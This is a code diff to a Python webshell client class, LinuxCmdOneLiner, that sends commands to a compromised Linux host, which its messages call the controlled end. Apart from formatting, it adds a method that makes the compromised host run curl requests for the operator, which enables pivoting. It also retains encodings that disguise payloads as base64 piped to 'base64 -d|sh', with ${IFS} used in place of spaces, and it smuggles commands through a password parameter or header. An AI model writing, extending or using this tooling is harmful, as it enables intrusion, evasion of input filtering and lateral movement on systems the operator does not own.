@@ -15,6 +15,7 @@ from ..core.base import (
     OptionGroup,
     DirectoryEntry,
     BasicInfoEntry,
+    HttpResponseDict,
     get_http_client,
 )
 
@@ -278,7 +279,9 @@ class LinuxCmdOneLiner:
 
             filetype = perm[0]
             perm = parse_file_permission(perm[1:10])
-            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(filetype, "unknown")
+            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(
+                filetype, "unknown"
+            )
             if filetype == "link":
                 filetype = "link-dir" if name.endswith("/") else "link-file"
                 name = name.split(" ->")[0]
@@ -287,7 +290,7 @@ class LinuxCmdOneLiner:
                     name=name,
                     permission=perm,
                     filesize=int(filesize),
-                    entry_type=filetype
+                    entry_type=filetype,
                 )
             )
         return result
@@ -462,6 +465,75 @@ class LinuxCmdOneLiner:
         """得到发送字节支持的TCP方法"""
         return []
 
+    async def send_http_request(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: t.Optional[t.Dict[str, str]] = None,
+        params: t.Optional[t.Dict[str, t.Any]] = None,
+        data: t.Optional[t.Union[str, bytes]] = None,
+    ) -> HttpResponseDict:
+        from urllib.parse import urlencode
+
+        curl_check = await self.submit("which curl")
+        if not curl_check.strip():
+            raise exceptions.TargetError("目标系统未安装curl命令")
+
+        cmd_parts = ["curl", "-s", "-i"]
+        cmd_parts.extend(["-X", method])
+
+        if headers:
+            for key, value in headers.items():
+                cmd_parts.extend(["-H", f"{key}: {value}"])
+
+        full_url = url
+        if params:
+            full_url = f"{url}?{urlencode(params)}"
+
+        if data is not None:
+            if isinstance(data, bytes):
+                data_str = base64.b64encode(data).decode()
+                cmd_parts.extend(["--data", data_str])
+            else:
+                cmd_parts.extend(["--data", data])
+
+        cmd_parts.append(full_url)
+        cmd_str = " ".join(shlex.quote(part) for part in cmd_parts)
+        output = await self.submit(cmd_str)
+
+        lines = output.splitlines()
+        if not lines:
+            raise exceptions.NetworkError("HTTP请求无响应")
+
+        status_line = lines[0]
+        if not status_line.startswith("HTTP/"):
+            raise exceptions.NetworkError(f"无效的HTTP响应: {status_line}")
+        status_parts = status_line.split()
+        if len(status_parts) < 2:
+            raise exceptions.NetworkError(f"无法解析状态码: {status_line}")
+        status_code = int(status_parts[1])
+
+        headers_dict: t.Dict[str, str] = {}
+        body_lines: t.List[str] = []
+        in_body = False
+        for line in lines[1:]:
+            if not in_body:
+                if line.strip() == "":
+                    in_body = True
+                    continue
+                if ":" in line:
+                    key, value = line.split(":", 1)
+                    headers_dict[key.strip()] = value.strip()
+            else:
+                body_lines.append(line)
+
+        body = "\n".join(body_lines)
+        return HttpResponseDict(
+            status_code=status_code,
+            headers=headers_dict,
+            body=body.encode() if body else b"",
+        )
+
     async def get_basicinfo(self):
         # TODO: 多加一点命令
         cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
@@ -488,12 +560,24 @@ class LinuxCmdOneLiner:
             start2=start2,
             code=payload if isinstance(payload, str) else shell_command(payload),
             stop=stop,
-            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, "")
+            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, ""),
         )
         if self.encoder == "base64_quote":
-            code = shell_command(["sh", "-c", "echo " + base64.b64encode(code.encode()).decode() + "|base64 -d|sh"])
+            code = shell_command(
+                [
+                    "sh",
+                    "-c",
+                    "echo "
+                    + base64.b64encode(code.encode()).decode()
+                    + "|base64 -d|sh",
+                ]
+            )
         elif self.encoder == "base64_ifs":
-            code = "sh -c echo${IFS}" + base64.b64encode(code.encode()).decode() + "|base64${IFS}-d|sh"
+            code = (
+                "sh -c echo${IFS}"
+                + base64.b64encode(code.encode()).decode()
+                + "|base64${IFS}-d|sh"
+            )
         elif self.encoder == "raw":
             pass
         else:
@@ -533,7 +617,9 @@ class LinuxCmdOneLiner:
             if self.password_method in ["GET", "HEAD"]:
                 kwargs["params"][self.password] = payload
             elif self.password_method == "HEADER":
-                kwargs["headers"][self.password] = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh"
+                kwargs["headers"][
+                    self.password
+                ] = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh"
             else:
                 kwargs["data"][self.password] = payload
             response = await self.client.request(
@@ -547,4 +633,6 @@ class LinuxCmdOneLiner:
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
         except httpx.HTTPError as exc:
-            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
+            raise exceptions.NetworkError(
+                "发送HTTP请求到受控端失败：" + str(exc)
+            ) from exc
